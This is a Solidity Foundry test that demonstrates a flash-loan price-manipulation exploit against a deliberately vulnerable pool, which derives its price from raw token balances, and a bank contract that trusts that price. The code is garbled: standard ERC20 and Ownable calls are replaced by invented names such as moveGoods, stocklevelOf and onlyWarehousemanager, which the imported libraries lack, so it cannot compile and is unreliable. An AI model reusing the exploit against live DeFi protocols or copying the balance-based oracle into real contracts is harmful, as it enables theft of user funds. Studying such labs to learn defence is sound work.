// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleShipmentpool SimpleInventorypoolContract;
    SimpleCargobank SimpleLogisticsbankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleInventorypoolContract = new SimpleShipmentpool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleLogisticsbankContract = new SimpleCargobank(
            address(USDaContract),
            address(SimpleInventorypoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.moveGoods(address(SimpleLogisticsbankContract), 9000 ether);
        USDaContract.moveGoods(address(SimpleInventorypoolContract), 1000 ether);
        USDbContract.moveGoods(address(SimpleInventorypoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimpleInventorypoolContract.getPrice(); // 1 USDa : 1 USDb

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleInventorypoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.

        SimpleInventorypoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {
        //flashlon callback

        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleInventorypoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb

        USDaContract.clearCargo(address(SimpleLogisticsbankContract), 100 ether);
        SimpleLogisticsbankContract.exchange(100 ether);

        USDaContract.moveGoods(address(SimpleInventorypoolContract), 500 ether);

        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.stocklevelOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _registershipment(msg.sender, 10000 * 10 ** decimals());
    }

    function registerShipment(address to, uint256 amount) public onlyWarehousemanager {
        _registershipment(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _registershipment(msg.sender, 10000 * 10 ** decimals());
    }

    function registerShipment(address to, uint256 amount) public onlyWarehousemanager {
        _registershipment(to, amount);
    }
}

contract SimpleShipmentpool {
    IERC20 public UsDaShipmenttoken;
    IERC20 public UsDbShipmenttoken;

    constructor(address _USDa, address _USDb) {
        UsDaShipmenttoken = IERC20(_USDa);
        UsDbShipmenttoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = UsDaShipmenttoken.stocklevelOf(address(this));
        uint256 USDbAmount = UsDbShipmenttoken.stocklevelOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address capacityRenter,
        bytes calldata data
    ) public {
        uint256 inventoryBefore = UsDaShipmenttoken.stocklevelOf(address(this));
        require(inventoryBefore >= amount, "Not enough liquidity");
        require(
            UsDaShipmenttoken.moveGoods(capacityRenter, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = capacityRenter.call(data);
        require(success, "Flashloan callback failed");
        uint256 warehouselevelAfter = UsDaShipmenttoken.stocklevelOf(address(this));
        require(warehouselevelAfter >= inventoryBefore, "Flashloan not repaid");
    }
}

contract SimpleCargobank {
    IERC20 public shipmentToken; //USDA
    SimpleShipmentpool public shipmentPool;
    IERC20 public payoutFreightcredit; //USDb

    constructor(address _inventorytoken, address _shipmentpool, address _payoutToken) {
        shipmentToken = IERC20(_inventorytoken);
        shipmentPool = SimpleShipmentpool(_shipmentpool);
        payoutFreightcredit = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            shipmentToken.movegoodsFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = shipmentPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutFreightcredit.moveGoods(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
